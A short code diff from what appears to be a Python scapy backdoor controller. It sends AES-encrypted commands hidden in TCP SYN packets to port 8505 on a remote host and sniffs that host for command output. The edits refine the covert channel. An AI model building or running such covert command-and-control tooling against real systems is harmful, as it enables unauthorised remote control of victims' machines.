@@ -37,12 +37,12 @@ def sendCommand():
             #Encrypt the command with AES encryption
             encryptedCommand = crypt.encrypt(authPacket + command)
             #Create the packet and store the command in the data field
-            pkt = IP(src="192.168.0.14", dst=destIP)/fuzz(TCP(dport=8505))/Raw(load=encryptedCommand)
+            pkt = IP(src="192.168.0.14", dst=destIP)/TCP(dport=8505, flag='S')/Raw(load=encryptedCommand)
             #Send the packet
             send(pkt)
             sending = False
         else:
-            sniff(timeout=2, filter="tcp and dst port 8505", prn=receiveOutput, stop_filter=stopfilter)
+            sniff(timeout=2, filter="tcp and host 192.168.0.15 and dst port 8505", prn=receiveOutput, stop_filter=stopfilter)
             sending = True
 
 def receiveOutput(pkt):
